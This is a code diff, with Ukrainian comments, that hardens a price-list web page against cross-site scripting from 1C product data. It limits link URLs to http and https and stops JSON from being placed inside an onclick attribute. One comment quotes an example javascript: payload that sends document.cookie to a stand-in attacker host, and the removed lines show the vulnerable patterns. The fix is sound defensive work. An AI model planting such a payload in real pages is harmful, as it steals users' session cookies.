@@ -810,6 +810,9 @@ let MAIN_TAB = 'prices';                 // активний головний т
 let fxLoaded = false;                    // чи вже завантажено FX-статус (для показу пілюлі лише на табі «Прайс»)
 
 const esc = s => String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+// Для href з даних 1С: пропускаємо лише http/https, інакше '#'. Інакше datasheet_url
+// = "javascript:fetch('//evil?c='+document.cookie)" з 1С виконався б по кліку.
+const safeUrl = u => /^https?:\/\//i.test(u || '') ? esc(u) : '#';
 const slugify = s => String(s || '').toLowerCase()
   .replace(/[àáâäãåā]/g,'a').replace(/[èéêëē]/g,'e').replace(/[ìíîïī]/g,'i')
   .replace(/[òóôöõø]/g,'o').replace(/[ùúûüū]/g,'u').replace(/[ñ]/g,'n').replace(/[ç]/g,'c')
@@ -1210,10 +1213,10 @@ function renderRow(it, c) {
   };
 
   const dsBadge = it.datasheet_url
-    ? ` <a href="${esc(it.datasheet_url)}" target="_blank" rel="noopener" class="ds-link" onclick="event.stopPropagation()">Dat ↗</a>`
+    ? ` <a href="${safeUrl(it.datasheet_url)}" target="_blank" rel="noopener" class="ds-link" onclick="event.stopPropagation()">Dat ↗</a>`
     : '';
   const certBadge = it.cert_url
-    ? ` <a href="${esc(it.cert_url)}" target="_blank" rel="noopener" class="ds-link" onclick="event.stopPropagation()">Cert ↗</a>`
+    ? ` <a href="${safeUrl(it.cert_url)}" target="_blank" rel="noopener" class="ds-link" onclick="event.stopPropagation()">Cert ↗</a>`
     : '';
 
   const warnIco = flags.no1c
@@ -1547,8 +1550,11 @@ async function runSearch(q) {
     if (!data.results || !data.results.length) {
       list.innerHTML = `<div class="ac-item"><span class="empty-row">Нічого не знайдено</span></div>`;
     } else {
-      list.innerHTML = data.results.map(r => `
-        <div class="ac-item" onclick='pickNom(${JSON.stringify(r)})'>
+      // Передаємо ІНДЕКС у збережений масив, не JSON-об'єкт в атрибут: JSON.stringify
+      // не екранує ' та <, тож назва товару з 1С могла розірвати onclick і виконати код.
+      window.__acResults = data.results;
+      list.innerHTML = data.results.map((r, i) => `
+        <div class="ac-item" onclick="pickNom(window.__acResults[${i}])">
           <div>${hl(r.description, q)}</div>
           ${r.article ? `<div class="art">арт. ${hl(r.article, q)}</div>` : ''}
         </div>
